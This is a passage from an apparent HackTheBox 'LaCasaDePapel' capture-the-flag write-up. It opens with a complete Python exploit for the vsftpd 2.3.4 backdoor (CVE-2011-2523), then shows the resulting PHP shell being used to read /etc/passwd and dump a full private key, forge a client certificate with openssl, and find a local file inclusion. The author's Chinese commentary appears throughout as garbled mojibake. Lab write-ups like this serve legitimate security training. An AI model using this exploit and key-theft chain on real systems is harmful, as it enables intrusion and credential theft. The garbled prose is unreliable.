http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html\n# Version: vsftpd 2.3.4\n# Tested on: debian\n# CVE : CVE-2011-2523\n\n#!/usr/bin/python3\n\nfrom telnetlib import Telnet\nimport argparse\nfrom signal import signal, SIGINT\nfrom sys import exit\n\ndef handler(signal_received, frame):\n    # Handle any cleanup here\n    print('   [+]Exiting...')\n    exit(0)\n\nsignal(SIGINT, handler)\nparser=argparse.ArgumentParser()\nparser.add_argument(\"host\", help=\"input the address of the vulnerable host\", type=str)\nargs = parser.parse_args()\nhost = args.host\nportFTP = 21 #if necessary edit this line\n\nuser=\"USER nergal:)\"\npassword=\"PASS pass\"\n\ntn=Telnet(host, portFTP)\ntn.read_until(b\"(vsFTPd 2.3.4)\") #if necessary, edit this line\ntn.write(user.encode('ascii') + b\"\\n\")\ntn.read_until(b\"password.\") #if necessary, edit this line\ntn.write(password.encode('ascii') + b\"\\n\")\n\ntn2=Telnet(host, 6200)\nprint('Success, shell opened')\nprint('Send `exit` to quit shell')\ntn2.interact()\n```\nè¿™é‡Œæ˜¯å¯¹ 21 ç«¯å£è¿›è¡Œäº†ç™»å½•ï¼Œä½†æ˜¯è´¦å·å´æ˜¯â€œ:)â€è¿™ä¹ˆä¸€ä¸ªç¬‘è„¸ï¼Ÿç­‰æ¢å¤å¥½ä»¥åå»å°è¯•æ‰‹åŠ¨åˆ©ç”¨å‘¢\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc 10.10.10.131 6200\n(UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused\n```\nç›´æ¥è¯·æ±‚ç¡®å®æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥ä¸€å¼€å§‹çš„æ‰«æç»“æœåº”è¯¥æ˜¯æ­£ç¡®çš„\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ftp 10.10.10.131                                                                                                  \nConnected to 10.10.10.131.\n220 (vsFTPd 2.3.4)\nName (10.10.10.131:root): lucifiel:)\n331 Please specify the password.\nPassword: \n\n421 Service not available, remote server timed out. Connection closed.\nftp: Login failed\n```\nç„¶åæˆ‘ä»¬éšä¾¿ä½¿ç”¨ä¸€ä¸ªè´¦å·ç™»å½• ftpï¼Œå°†ç»“æœæ·»åŠ ä¸Š :) ç¬‘è„¸å°±å¯ä»¥äº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -vvv -p6200 10.10.10.131                       \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:44 CST\nInitiating Ping Scan at 04:44\nScanning 10.10.10.131 [4 ports]\nCompleted Ping Scan at 04:44, 0.42s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:44\nCompleted Parallel DNS resolution of 1 host. at 04:44, 0.01s elapsed\nDNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 04:44\nScanning 10.10.10.131 [1 port]\nDiscovered open port 6200/tcp on 10.10.10.131\nCompleted SYN Stealth Scan at 04:44, 0.44s elapsed (1 total ports)\nNmap scan report for 10.10.10.131\nHost is up, received echo-reply ttl 63 (0.39s latency).\nScanned at 2023-01-09 04:44:06 CST for 0s\n\nPORT     STATE SERVICE REASON\n6200/tcp open  lm-x    syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.97 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 5 (196B)\n```\nç„¶åå†æ‰«æå°±æ˜¯æ˜¾ç¤º open\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc 10.10.10.131 6200\nPsy Shell v0.9.9 (PHP 7.2.10 â€” cli) by Justin Hileman\n```\nç„¶åå†è¿æ¥å°±æ˜¾ç¤ºç»™äº†æˆ‘ä»¬ä¸€ä¸ª php shell\n\n> [https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php](https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php)\n\nè¿™é‡Œæ‰¾åˆ°ä¸€ç¯‡å‚è€ƒæ–‡ç« ï¼Œæ˜¾ç¤ºå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨è¿™ä¸ª php shell æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå¼•å· \\` æ¥å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ç»™åŒ…èµ·æ¥ï¼Œæˆ‘ä»¬å»å°è¯•æ‰§è¡Œä¸€ä¸‹\n\n```bash\n`whoami`\nPHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()'d code on line 1\n```\nè¿™é‡Œæç¤ºé”™è¯¯ï¼Œä½†æ˜¯çŸ¥é“äº†æ‰§è¡Œæˆ‘ä»¬å‘½ä»¤çš„å‡½æ•°æ˜¯ shell\\_exec()\n\nå¦‚æœæˆ‘ä»¬å°è¯•è‡ªå·±æ„é€ å‘½ä»¤å‘¢ï¼Ÿ\n\n```bash\necho(\"I'm Lucifiel!\")\nI'm Lucifiel!â\nsystem(\"whoami\")\nPHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1\nsystem(\"id\")\nPHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1\n```\necho è¢«æˆåŠŸè¾“å‡ºäº†ï¼Œä½†æ˜¯ shell çš„ä¼¼ä¹æ²¡æœ‰è¾“å‡ºï¼Ÿæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°è¯•ä¸€ä¸‹å“ªäº›å‡½æ•°å¯ä»¥è¢«æ‰§è¡Œ\n\n```php\nphphpinfo()\nphpinfo()\nPHP Version => 7.2.10\n\nSystem => Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64\nBuild Date => Sep 17 2018 09:23:43\n```\nphpinfo å¯ä»¥è¢«æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æ˜¾ç¤ºå¾ˆå¤šé‡è¦çš„ä¿¡æ¯ï¼Œä½†æ˜¯ç”±äºå†…å®¹å¤ªå¤šæˆ‘å°±ä¸å…¨éƒ¨è´´ä¸Šæ¥äº†\n\n```php\ndisable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source\n```\næˆ‘ä»¬è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œåˆšæ‰å°è¯•çš„éƒ¨åˆ†å‡½æ•°å·²ç»è¢« php ç¦ç”¨äº†\n\nå»ç¿»ä¸€ä¸‹ php å‡½æ•°å§ï¼Œå¤ä¹ å¤ä¹ åŸºæœ¬åŠŸ\n\n> [https://www.runoob.com/php/php-ref-directory.html](https://www.runoob.com/php/php-ref-directory.html)\n\nè¿˜çœŸæ‰¾åˆ°ä¸€ä¸ªï¼Œscandir() å‡½æ•°ï¼Œè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚\n\n```bash\nscandir(\".\")\n=> [\n     \".\",\n     \"..\",\n     \".DS_Store\",\n     \"._.DS_Store\",\n     \"bin\",\n     \"boot\",\n     \"dev\",\n     \"etc\",\n     \"home\",\n     \"lib\",\n     \"lost+found\",\n     \"media\",\n     \"mnt\",\n     \"opt\",\n     \"proc\",\n     \"root\",\n     \"run\",\n     \"sbin\",\n     \"srv\",\n     \"swap\",\n     \"sys\",\n     \"tmp\",\n     \"usr\",\n     \"var\",\n   ]\n```\nå½“å‰æˆ‘ä»¬åœ¨æ ¹ç›®å½•ï¼Œè€Œä¸” mac ç”¨æˆ·çœ‹åˆ° .DS\\_Store åº”è¯¥èƒ½æƒ³åˆ°ï¼Œè¿™å°æ˜¯å’Œ mac è¿›è¡Œè¿‡è¿æ¥çš„\n\n```bash\nscandir(\"/home/\")\n=> [\n     \".\",\n     \"..\",\n     \"berlin\",\n     \"dali\",\n     \"nairobi\",\n     \"oslo\",\n     \"professor\",\n   ]\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯æœ‰äº”ä¸ªç”¨æˆ·çš„\n\n```bash\nfile_get_contents(\"/etc/passwd\")\n=> \"\"\"\n   root:x:0:0:root:/root:/bin/ash\\n\n   bin:x:1:1:bin:/bin:/sbin/nologin\\n\n   daemon:x:2:2:daemon:/sbin:/sbin/nologin\\n\n   adm:x:3:4:adm:/var/adm:/sbin/nologin\\n\n   lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\\n\n   sync:x:5:0:sync:/sbin:/bin/sync\\n\n   shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\\n\n   halt:x:7:0:halt:/sbin:/sbin/halt\\n\n   mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\\n\n   news:x:9:13:news:/usr/lib/news:/sbin/nologin\\n\n   uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\\n\n   operator:x:11:0:operator:/root:/bin/sh\\n\n   man:x:13:15:man:/usr/man:/sbin/nologin\\n\n   postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\\n\n   cron:x:16:16:cron:/var/spool/cron:/sbin/nologin\\n\n   ftp:x:21:21::/var/lib/ftp:/sbin/nologin\\n\n   sshd:x:22:22:sshd:/dev/null:/sbin/nologin\\n\n   at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\\n\n   squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\\n\n   xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\\n\n   games:x:35:35:games:/usr/games:/sbin/nologin\\n\n   postgres:x:70:70::/var/lib/postgresql:/bin/sh\\n\n   cyrus:x:85:12::/usr/cyrus:/sbin/nologin\\n\n   vpopmail:x:89:89::/var/vpopmail:/sbin/nologin\\n\n   ntp:x:123:123:NTP:/var/empty:/sbin/nologin\\n\n   smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\\n\n   guest:x:405:100:guest:/dev/null:/sbin/nologin\\n\n   nobody:x:65534:65534:nobody:/:/sbin/nologin\\n\n   chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin\\n\n   dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh\\n\n   berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash\\n\n   professor:x:1002:1002:professor,,,:/home/professor:/bin/ash\\n\n   vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin\\n\n   memcached:x:102:102:memcached:/home/memcached:/sbin/nologin\\n\n   \"\"\"\n```\nå¯ä»¥ç¡®å®šè¿™å‡ ä¸ªç”¨æˆ·ä¸æ˜¯éƒ½æœ‰ bash æƒé™çš„ï¼Œæˆ‘ä»¬å»çœ‹çœ‹æœ‰æ²¡æœ‰æƒé™è·å¾—æŸä¸ªçš„ ssh å¯†é’¥å§\n\n```bash\nscandir(\"/home/dali/.ssh\")\n=> [\n     \".\",\n     \"..\",\n     \"authorized_keys\",\n     \"known_hosts\",\n   ]\n```\nç»è¿‡æµ‹è¯•ï¼Œåªæœ‰ dali çš„ç›®å½•å’±ä»¬æœ‰æƒé™\n\n```bash\nfile_get_contents(\"/home/nairobi/ca.key\")\n=> \"\"\"\n   -----BEGIN PRIVATE KEY-----\\n\n   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n\n   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n\n   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n\n   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n\n   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n\n   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n\n   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n\n   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n\n   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n\n   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n\n   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n\n   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n\n   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n\n   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n\n   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n\n   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n                                                                                                                                              \n   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n\n   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n\n   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n\n   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n\n   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n\n   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n\n   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n\n   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n\n   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n\n   53udBEzjt3WPqYGkkDknVhjD\\n\n   -----END PRIVATE KEY-----\\n\n   \"\"\"\n```\næˆ‘ä»¬åœ¨ nairobi ç”¨æˆ·ä¸‹å‘ç°äº†ä¸€ä¸ª ca.key æ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€æ®µè¯ä¹¦ï¼Ÿè¿˜æ˜¯å¯†é’¥ï¼Ÿè¯´ä¸å¥½\n\n```bash\n   -----BEGIN PRIVATE KEY-----\\n\n   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n\n   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n\n   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n\n   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n\n   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n\n   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n\n   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n\n   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n\n   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n\n   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n\n   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n\n   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n\n   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n\n   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n\n   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n\n   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n                                                                                                                                              \n   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n\n   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n\n   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n\n   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n\n   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n\n   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n\n   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n\n   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n\n   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n\n   53udBEzjt3WPqYGkkDknVhjD\\n\n   -----END PRIVATE KEY-----\\n\n```\nè¿™æ ·ç›´æ¥ä¿å­˜ä¸‹æ¥ï¼Œæ ¼å¼çœŸæ˜¯ç›¸å½“çš„ä¹±å•Šï¼Œç¨å¾®æ›¿æ¢æ•´ç†ä¸€ä¸‹\n\nåœ¨ vim ä¸­ä½¿ç”¨ `:%s/\\\\n//g/ ` å’Œ `:%s/ //g`å°±è¡Œæ›¿æ¢\n\nå¾—åˆ°äº†å¹²å‡€å¯†é’¥\n\n```bash\n-----BEGINPRIVATEKEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\nuXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\nYQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\ns2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\nPCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\nDj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\nq0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\nuaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\nI0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\nG3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\nsqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\nCTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\nsm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\nikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\nzo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\nukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\nWGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\naRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n53udBEzjt3WPqYGkkDknVhjD\n-----ENDPRIVATEKEY-----\n```\nä½†æ˜¯ç©ºæ ¼è¢«æˆ‘ä»¬åˆ é™¤å®Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¿®æ”¹ä¸€ä¸‹\n\n```bash\n-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\nuXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\nYQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\ns2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\nPCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\nDj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\nq0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\nuaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\nI0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\nG3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\nsqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\nCTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\nsm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\nikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\nzo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\nukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\nWGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\naRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n53udBEzjt3WPqYGkkDknVhjD\n-----END PRIVATE KEY-----\n```\nokï¼Œè¿™æ ·æ‰æ˜¯ä¸€ä¸ªå®Œæ•´æ­£ç¡®çš„å¯†é’¥\n\nç„¶åæˆ‘ä»¬å»ç”Ÿæˆä¸€ä¸ªè¯ä¹¦\n\n```bash\nopenssl req -new -key ca.key -out server.csr\nopenssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt\nopenssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12\n```\nå†…å®¹å¯ä»¥éšä¾¿å¡«\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# openssl req -new -key ca.key -out server.csr\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\n\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:\nAn optional company name []:\n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt\nCertificate request self-signature ok\nsubject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd\n                                                                                                                                                                                                                   \nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12\nEnter Export Password:\nVerifying - Enter Export Password:\n```\nokï¼Œè¿™æ ·æˆ‘ä»¬å°±ç”Ÿæˆäº†æˆ‘ä»¬éœ€è¦çš„è¯ä¹¦\n\nç„¶åæˆ‘ä»¬å»æµè§ˆå™¨å¯¼å…¥æˆ‘ä»¬çš„ p12 è¯ä¹¦\n\n![](Hackthebox-LaCasaDePapel/-wiD2gbXNCqNo5iOANVEAC7T-WwPSyqe_HJ9W92wN-s.png)\n\nokï¼ŒæˆåŠŸå¯¼å…¥åæˆ‘ä»¬å°±å¯ä»¥è®¿é—®äº†\n\n![](Hackthebox-LaCasaDePapel/KP-SZZ5BnZYYzlnFOVL0hgRE8Pi_qKsyRgEkiu6cx98.png)\n\n![](Hackthebox-LaCasaDePapel/9bXUELyCTkRNy_J_pavKmQaR-GOD8F69YOFbTzydsb4.png)\n\né¼ æ ‡æ”¾ä¸Šå»å°±å¯ä»¥çœ‹åˆ°å·¦ä¸‹è§’å‡ºç°äº† https://10.10.10.131/?path=SEASON-1\n\nè¿™å¾ˆæ˜æ˜¾æœ‰ lfi äº†å§\n\n![](Hackthebox-LaCasaDePapel/Uxh-rQNITspoWqH8zp8-w1NMNr78MzJkzdbpjAj-V90.png)\n\næˆåŠŸåŒ…å«åˆ°ç›®å½•ï¼Œæˆ‘ä»¬å»å°è¯•ä¸€ä¸‹è·å– ssh çš„å¯†é’¥\n\n![](Hackthebox-LaCasaDePapel/wO2r5A4NLWq8DLWv26i9xJCKMxhCyssLKFU5lO4p-pw.png)\n\nä½†æ˜¯ç›´æ¥è·å–ä¼šå‡ºé”™ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹ä»–çš„æ–‡ä»¶æ ¼å¼æ˜¯æ€æ ·çš„\n\n![](Hackthebox-LaCasaDePapel/sDjgugciDRq_WY4nsyjF039vEQkzhdzmL3Oj92ig1j0.png)\n\nä¼¼ä¹æ˜¯è½¬æ¢ä¸º base64 